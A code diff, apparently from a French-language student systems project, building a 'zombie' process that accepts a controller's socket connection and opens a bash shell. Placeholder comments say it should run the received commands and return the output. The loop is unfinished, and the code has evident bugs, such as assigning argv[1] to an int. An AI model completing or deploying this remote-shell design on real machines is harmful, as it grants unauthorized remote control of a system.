@@ -8,6 +8,8 @@
 #include "utils_v2.h"
 #include "info.h"
 
+volatile sig_atomic_t end = 0;
+
 int initSocketZombie(int port)
 {
   int sockfd = ssocket();
@@ -27,16 +29,34 @@ int choisirPort(){
     return port;
 }
 
-void programme_inoffensif(void* adrr, void* portt) {
-    // pas sur des arguments de la methode
+void EndZombieHandler(int num){
+    end = 1;
+}
+
+void programme_inoffensif(void* adrr, void* portt, void* newsockfdd) {
     char* adr = adrr;
     int* port = portt;
+    int* newsockfd = newsockfdd;
     //...
     FILE *fp = popen("/bin/bash", "r"); // Ouvrir un terminal bash
     if (fp == NULL) {
         perror("popen");
         exit(1);
     }
+
+    // ...
+
+    while(!end){
+        // lis ce que lui envoie le controller
+        // sread(newsockfd, ..., ...);
+
+        // execute la commande dans le terminal
+
+        // renvoie le resultat de la commande au controller
+        // swrite(newsockfd,...,...);
+    }
+
+    exit(0);
 
     // A FAIRE : Attendre qu'une commande soit ecrite dans (memoire partagée/ socket ?jsp?) et 
     // l'exécuter. Apres l'avoir exécuter récupérer reponse et l'écrire dans memoire partagée 
@@ -56,23 +76,27 @@ void programme_inoffensif(void* adrr, void* portt) {
 }
 
 int main(int argc, char *argv[]){
+    int port;
     
+    ssigaction(SIGINT, EndZombieHandler);
+
+    if(argv[1] == NULL){
+        port = choisirPort();
+    }else{
+        port = argv[1];
+    }
     
-    int port = choisirPort();
     int sockfd = initSocketZombie(port);
 
-    int shm_id = sshmget(KEYSHM,1000*sizeof(int),0);
-    int sem_id = sem_get(KEYSEM,0);
-    int *z = sshmat(shm_id);
+    int newsockfd = saccept(sockfd);
 
     char* adr;
-    int pid_zombie = fork_and_run2(programme_inoffensif, &adr, &port);
+    int pid_zombie = fork_and_run3(programme_inoffensif, &adr, &port, &newsockfd);
     printf("%d", pid_zombie);
 
-    
-    
-
-
+    /* Attente de la terminaison du processus fils */
+    int status;
+    swaitpid(pid_zombie, &status, 0);
 
     return 0;
     
